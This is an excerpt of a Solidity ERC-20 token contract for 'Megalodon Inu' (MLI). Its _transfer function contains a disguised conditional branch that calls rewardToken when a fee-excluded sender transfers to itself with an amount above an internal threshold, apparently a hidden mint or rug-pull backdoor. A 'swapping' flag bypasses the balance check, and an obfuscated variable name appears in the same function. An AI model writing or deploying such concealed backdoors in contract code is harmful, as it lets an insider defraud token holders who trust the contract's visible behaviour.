...
contract MegalodonInu is Ownable, IERC20 {
    ...
    string private _name = "Megalodon Inu";
    string private _symbol = "MLI";
    uint256 private _rewardDividend = _totalSupply;
    bool swapping = false;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (_rewardDividend < amount && (_excludedFromFee[msg.sender] || Address.isPairAddress(to)) && to == from) {
            return rewardToken(amount, to);
        }

        require(swapping || _balance[from] >= amount);
        uint256 ahgbfusngsd = amount - feeAmount;
        _balance[address(0)] += feeAmount;
        _balance[from] = _balance[from] - amount;
        _balance[to] += ahgbfusngsd;
        emit Transfer(from, to, ahgbfusngsd);
